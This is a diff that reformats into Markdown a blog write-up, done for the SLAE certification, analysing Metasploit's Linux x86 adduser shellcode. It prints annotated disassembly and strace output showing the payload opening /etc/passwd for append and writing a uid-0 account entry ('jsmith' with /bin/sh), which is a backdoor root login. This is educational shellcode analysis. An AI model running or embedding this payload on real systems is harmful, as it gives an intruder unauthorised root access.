@@ -56,7 +56,10 @@ First the shellcode restores the privileges, in case the running process would h
 00000007  CD80              int 0x80                ; Fire the interrupt
 ```
 
-Next, it will open the /etc/passwd file. The flags for opening the file will be set to 0x00000401: O_WRONLY|O_APPEND. (Note1: the mode for opening the file, which should have been in EDX register, is not specified because it is ignored for O_CREAT flag not specified): 
+Next, it will open the _`/etc/passwd`_ file. The flags for opening the file will be set to *`0x00000401: O_WRONLY|O_APPEND`*. 
+
+*__Note1__*: the mode for opening the file, which should have been in `EDX` register, is not specified because it is ignored for _`O_CREAT`_ flag not specified:
+```asm
 00000009  6A05              push byte +0x5
 0000000B  58                pop eax                 ; Prepare eax for sys_open syscall
 0000000C  31C9              xor ecx,ecx             ; Set ecx to 0 
@@ -66,15 +69,17 @@ Next, it will open the /etc/passwd file. The flags for opening the file will be 
 00000019  682F657463        push dword 0x6374652f   ; 'cte/'
 0000001E  89E3              mov ebx,esp             ; Filename: '/etc//passwd'
 00000020  41                inc ecx  
-Note2: the open syscall and the parameters can also be easily viewed using strace program: 
-?
-1
-2
-3
+```
+
+*__Note2__*: the _`open`_ syscall and the parameters can also be easily viewed using strace program: 
+```bash
 # strace ./shellcode
-. . . 
+[..]
 open("/etc//passwd", O_WRONLY|O_APPEND) = 3 
-The next part will write the "jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh\n" string to it (username and encrypted password): 
+```
+
+The next part will write the _`jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh\n`_ string to it (username and encrypted password): 
+```asm
 00000025  93                xchg eax,ebx
 00000026  E824000000        call dword 0x4f
 ; String starts  here -->
@@ -107,21 +112,8 @@ Finally the shellcode calls the exit function to cleanly finish execution:
 00000058  6A01              push byte +0x1
 0000005A  58                pop eax         ; sys_exit syscall
 0000005B  CD80              int 0x80
+```
 
-The complete source files and scripts mentioned in this post can be found in the Git repository:
-SLAE
+The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).
 
-This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:        
-www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/    
-Student ID: SLAE- 449 
-Posted by Liviu at 6:50 PM     
-Email This
-BlogThis!
-Share to Twitter
-Share to Facebook
-Share to Pinterest
-
-Labels: adduser, metasploit, shellcode, SLAE
-Reactions: 	
-No comments:
-Post a Comm
+> This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
